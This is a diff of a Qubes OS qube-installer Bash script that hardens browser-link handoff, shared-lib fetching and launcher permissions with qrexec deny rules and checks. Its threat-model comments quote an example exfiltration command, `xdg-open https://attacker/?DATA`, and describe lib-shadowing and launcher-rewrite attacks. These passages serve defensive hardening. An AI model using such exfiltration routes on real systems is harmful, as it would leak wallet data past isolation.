@@ -25,7 +25,22 @@
 #                 added qubes that don't fit the categories above.
 #                 https://doc.qubes-os.org/en/latest/introduction/getting-started.html
 #   * components live under install-scripts/components/<name>/ (mix and match)
-#   * trailing 'offline' detaches the app qube from netvm (used for keepass)
+#   * trailing flags, any order, any subset:
+#       - 'offline'    -- detaches the app qube from netvm (used for keepass).
+#                         IMPLIES 'no-handoff' (an offline qube with the
+#                         browser handoff wired would still be able to drive
+#                         A-brave via qrexec to fetch a chosen URL --
+#                         silently defeating the air-gap).
+#       - 'no-handoff' -- do NOT register the qrexec browser-link handoff
+#                         for this qube (no /usr/share/applications/<…>
+#                         launcher, no xdg-settings default-web-browser),
+#                         AND install a dom0 qrexec deny rule blocking
+#                         qubes.OpenURL from this qube to any target.
+#                         Use for qubes that should not be able to silently
+#                         drive A-brave -- notably wallet qubes, which hold
+#                         value and where a compromised extension could
+#                         otherwise exfiltrate via `xdg-open https://attacker/?DATA`
+#                         routed through the open handoff policy.
 
 # Single-component qubes -- one app per qube.
 SINGLE_QUBES=(
@@ -47,9 +62,14 @@ DEV_QUBES=(
 
 # Wallet qubes -- use 'brave-extension-<name>' to add a wallet extension
 # (looked up in BRAVE_EXTENSIONS below; Brave is auto-installed when needed).
+# 'no-handoff' deliberately blocks qubes.OpenURL from these qubes: a
+# compromised wallet extension would otherwise be able to ferry data
+# silently via `xdg-open https://attacker/?DATA` -> A-brave -> network,
+# bypassing any qvm-firewall lockdown the operator later adds to these
+# qubes (qvm-firewall does not gate qrexec calls).
 WALLET_QUBES=(
-	"wallet-ledger gray ledger brave-extension-rabby"   # exposed (extensions, online) AND holds value
-	"wallet-trezor gray trezor brave-extension-rabby"   # exposed (extensions, online) AND holds value
+	"wallet-ledger gray ledger brave-extension-rabby no-handoff"   # exposed (extensions, online) AND holds value
+	"wallet-trezor gray trezor brave-extension-rabby no-handoff"   # exposed (extensions, online) AND holds value
 )
 
 # Brave wallet extension name -> Chrome Web Store ID. Reference these as
@@ -278,7 +298,7 @@ function fetchRunClean() {
 		# validated against the same safe pattern used elsewhere so a hostile
 		# REPO_VM cannot return a filename containing shell metacharacters that
 		# would then be interpolated into a remote qvm-run command.
-		local assets="" asset
+		local assets="" asset _lib _asset_lib_collision
 		if [ -n "${raw_assets}" ]; then
 			while IFS= read -r asset; do
 				[ -z "${asset}" ] && continue
@@ -287,6 +307,27 @@ function fetchRunClean() {
 				esac
 				if ! [[ "${asset}" =~ ^[A-Za-z0-9_][A-Za-z0-9._-]*$ ]]; then
 					echo "ERROR: refusing unsafe asset filename from ${REPO_VM}: '${asset}'" >&2
+					exit 1
+				fi
+				# Refuse any asset whose basename collides with a shared
+				# lib (e.g., a component dir shipping its own verify-gpg.sh
+				# or brave.sh). Libs are fetched FIRST above and land in
+				# dom0 cwd by basename; the asset fetch that follows would
+				# overwrite the lib with the same basename, and the install
+				# script's `. "$(dirname "$0")/verify-gpg.sh"` would then
+				# source the attacker's version -- bypassing the gpg pin
+				# code the lib carries (BitBox/KeePass/OpenOffice all chain
+				# their signature check through verify_imported_keyring_matches
+				# / verify_detached_sig from verify-gpg.sh).
+				_asset_lib_collision=""
+				for _lib in ${LIB_FILES}; do
+					if [ "${asset}" = "${_lib}" ]; then
+						_asset_lib_collision="${_lib}"
+						break
+					fi
+				done
+				if [ -n "${_asset_lib_collision}" ]; then
+					echo "ERROR: component '${APP}' ships asset '${asset}' that collides with shared lib '${_asset_lib_collision}' from ${LIB_PATH} -- refusing to ship a component file that would shadow the lib in dom0 cwd." >&2
 					exit 1
 				fi
 				if fetchFromVm ${REPO_VM} "${FILE_PATH}${asset}"; then
@@ -306,7 +347,20 @@ function fetchRunClean() {
 
 		if [ "${has_desktop}" -eq 1 ]; then
 			echo "Installing ${DESKTOP_NAME}.desktop launcher..."
-			vmRun -p ${VMNAME} "sudo mv /home/user/QubesIncoming/dom0/menu.desktop /usr/share/applications/${DESKTOP_NAME}.desktop"
+			# Install root-owned, mode 0644. The previous shape was
+			#     sudo mv /home/user/QubesIncoming/dom0/menu.desktop \
+			#            /usr/share/applications/<name>.desktop
+			# which preserves the source file's user:user ownership (mv is a
+			# rename within the same fs and does not change owner/mode).
+			# That left /usr/share/applications/<name>.desktop writable by
+			# the qube user account, so anything running as 'user' in the
+			# qube could rewrite the Exec= line to point at attacker code
+			# -- next menu click launches that against whatever the launcher
+			# was supposed to start. For keepass that means against an
+			# unlocked vault. Same defensive shape as setBrowserQube's
+			# launcher install, which fixed exactly this footgun for the
+			# browser-handoff .desktop.
+			vmRun -u root -p ${VMNAME} "install -m 0644 -o root -g root /home/user/QubesIncoming/dom0/menu.desktop /usr/share/applications/${DESKTOP_NAME}.desktop"
 		fi
 
 		echo "Cleaning up ${APP} install files on VM ${VMNAME}..."
@@ -469,6 +523,60 @@ function setupBrowserPolicy() {
 
 	echo "allowing all qubes to open links in ${BROWSER_VM}..."
 	installRootFile "${policy}" "${rule}"$'\n'
+}
+
+# Populated by validateAllQubes from the 'offline' / 'no-handoff' flags on
+# each qube spec. setupBrowserSuppressionPolicy turns it into a dom0 qrexec
+# deny file BEFORE any qube is built, and installQube reads the same flags
+# at build time to skip the per-qube xdg-open wiring.
+SUPPRESSED_HANDOFF_QUBES=()
+
+# Install a dom0 qrexec deny rule for every qube in SUPPRESSED_HANDOFF_QUBES.
+# Lives at 28-browser-suppress.policy so it wins over the 29- allow set up
+# by setupBrowserPolicy (qrexec evaluates lower-numbered files first;
+# first match wins). Without this, the offline keepass qube and the wallet
+# qubes -- which deliberately do NOT get the xdg-open handler -- could
+# STILL invoke qubes.OpenURL via any code path that goes straight to
+# qrexec (qvm-open-in-vm from the shell, libqrexec from a compromised
+# binary, etc.), because the per-qube xdg config and the dom0 policy are
+# independent gates.
+function setupBrowserSuppressionPolicy() {
+	local policy="/etc/qubes/policy.d/28-browser-suppress.policy"
+
+	# No suppressed qubes? Remove any stale policy file from a prior run
+	# (so dropping 'no-handoff' from a spec actually re-allows handoff,
+	# instead of silently leaving the old deny rules in place).
+	if [ "${#SUPPRESSED_HANDOFF_QUBES[@]}" -eq 0 ]; then
+		if [ -e "${policy}" ]; then
+			confirmPolicyOverwrite "${policy}" "<file will be removed -- no qubes are currently flagged 'offline' or 'no-handoff'>" \
+				"No qube in the current configuration carries 'offline' or 'no-handoff', so the previously-installed browser-suppression deny rules are no longer required. Removing the file restores the default 29-browser.policy allow behaviour for every qube."
+			sudo rm -f "${policy}"
+		fi
+		return 0
+	fi
+
+	# Build the rule block. printf %q-style escaping is unnecessary: each
+	# qube name is the literal "${PREFIX_APP_VM}${NAME}" where NAME has
+	# already been regex-validated by validateAllQubes to match
+	# [A-Za-z0-9_][A-Za-z0-9._-]*, so it cannot carry policy-file
+	# metacharacters.
+	local rules="" vm preview=""
+	for vm in "${SUPPRESSED_HANDOFF_QUBES[@]}"; do
+		rules+="qubes.OpenURL  *  ${vm}  @anyvm  deny"$'\n'
+		# Real newlines (not literal "\n") so the multi-line preview
+		# renders one rule per boxed line in confirmPolicyOverwrite's
+		# fold-wrapped frame on re-run prompts.
+		preview+="qubes.OpenURL * ${vm} @anyvm deny"$'\n'
+	done
+	# Strip the trailing newline so the boxed prompt doesn't print an
+	# empty padding line after the last rule.
+	preview="${preview%$'\n'}"
+
+	confirmPolicyOverwrite "${policy}" "${preview}" \
+		"This file blocks qubes.OpenURL from each 'offline' / 'no-handoff' qube to ANY target. It is evaluated before 29-browser.policy, so the deny fires before the @anyvm -> ${BROWSER_VM} allow rule and the offline / no-handoff opt-in is actually enforced at the dom0 boundary -- not just at the qube's xdg config (which a compromise of the qube user account could bypass)."
+
+	echo "installing ${policy} (deny qubes.OpenURL from ${#SUPPRESSED_HANDOFF_QUBES[@]} suppressed qube(s))..."
+	installRootFile "${policy}" "${rules}"
 }
 
 # On Qubes 4.3 the shipped /etc/qubes/policy.d/50-config-input.policy silently
@@ -666,15 +774,32 @@ function validateAllQubes() {
 
 	local errors=0
 	local seen_names=" " spec NAME
+	# Reset the suppression list each call so a re-invocation with edited
+	# specs (e.g. 'no-handoff' added or removed) starts from a clean slate.
+	SUPPRESSED_HANDOFF_QUBES=()
 
 	# iterate every configured qube
 	for spec in "${SINGLE_QUBES[@]}" "${WALLET_QUBES[@]}" "${DEV_QUBES[@]}"; do
 		local args=(${spec})
 		NAME="${args[0]}"
 		local n=${#args[@]}
-		# strip trailing 'offline'
-		if [ "${args[$((n-1))]}" = "offline" ]; then
-			n=$((n-1))
+		# Strip trailing flags ('offline', 'no-handoff') in any order. The
+		# `n > 2` guard prevents a malformed spec like "name color offline
+		# offline" from chewing past COLOR into NAME.
+		local spec_offline=0 spec_no_handoff=0
+		while [ "${n}" -gt 2 ]; do
+			case "${args[$((n-1))]}" in
+				offline)    spec_offline=1;    n=$((n-1)) ;;
+				no-handoff) spec_no_handoff=1; n=$((n-1)) ;;
+				*) break ;;
+			esac
+		done
+		# offline implies no-handoff: an offline qube whose xdg / qrexec
+		# OpenURL channel is still wired to A-brave can have any in-qube
+		# code call qvm-open-in-vm to ferry data out as a URL query --
+		# defeating the air-gap the operator chose 'offline' for.
+		if [ "${spec_offline}" -eq 1 ] || [ "${spec_no_handoff}" -eq 1 ]; then
+			SUPPRESSED_HANDOFF_QUBES+=("${PREFIX_APP_VM}${NAME}")
 		fi
 
 		# duplicate name within this run?
@@ -835,7 +960,14 @@ ExecStop=/usr/local/bin/seqs-cleanup
 WantedBy=multi-user.target
 EOF
 
-	vmRun -u root -p ${TEMPLATE_VM} "systemctl enable seqs-cleanup.service"
+	# daemon-reload BEFORE enable so systemd picks up the just-written
+	# unit file. Skipping it means `systemctl enable` symlinks a unit
+	# whose contents systemd hasn't loaded yet; the next boot is fine
+	# because units are re-read at boot, but any verification step the
+	# operator does in-template ("systemctl start seqs-cleanup.service"
+	# to confirm) hits a "unit file changed on disk" warning that masks
+	# real errors. Chain with && so a failed reload aborts before enable.
+	vmRun -u root -p ${TEMPLATE_VM} "systemctl daemon-reload && systemctl enable seqs-cleanup.service"
 }
 
 # braveExtensionInstall VM EXT_NAME -- install one Brave extension into VM.
@@ -888,14 +1020,30 @@ function installQube() {
 	local COLOR="${2}"
 	shift 2
 
-	# detect trailing 'offline' flag and strip it from the component list
+	# detect trailing 'offline' / 'no-handoff' flags (any order) and strip
+	# them from the component list. Keep the same parsing as validateAllQubes
+	# so the two cannot drift.
 	local OFFLINE=""
+	local NO_HANDOFF=""
 	local args=("$@")
 	local n=${#args[@]}
-	if [ "${n}" -gt 0 ] && [ "${args[$((n-1))]}" = "offline" ]; then
-		OFFLINE="offline"
-		unset 'args[n-1]'
-	fi
+	while [ "${n}" -gt 0 ]; do
+		case "${args[$((n-1))]}" in
+			offline)
+				OFFLINE="offline"
+				unset 'args[n-1]'
+				n=$((n-1))
+				;;
+			no-handoff)
+				NO_HANDOFF="no-handoff"
+				unset 'args[n-1]'
+				n=$((n-1))
+				;;
+			*) break ;;
+		esac
+	done
+	# offline implies no-handoff -- see validateAllQubes comment.
+	[ -n "${OFFLINE}" ] && NO_HANDOFF="no-handoff"
 	local COMPONENTS="${args[*]}"
 
 	local APP_VM="${PREFIX_APP_VM}${NAME}"
@@ -974,8 +1122,13 @@ function installQube() {
 			esac
 		done
 
-		# open web links in the browser qube (except for the browser qube itself)
-		if [[ "${APP_VM}" != "${BROWSER_VM}" ]]; then
+		# open web links in the browser qube (except for the browser qube
+		# itself, and except for qubes that explicitly opt out via
+		# 'offline' / 'no-handoff'). The dom0 deny rule that bounds this at
+		# the qrexec boundary is installed once, up-front, by
+		# setupBrowserSuppressionPolicy -- both gates have to be in place
+		# for the opt-out to actually hold.
+		if [[ "${APP_VM}" != "${BROWSER_VM}" ]] && [ -z "${NO_HANDOFF}" ]; then
 			setBrowserQube ${APP_VM}
 		fi
 
@@ -1092,6 +1245,7 @@ validateAllQubes
 validateCleanupDirs
 
 setupBrowserPolicy
+setupBrowserSuppressionPolicy
 setupUsbKeyboardPolicy
 
 # Single-component qubes (one app per qube)
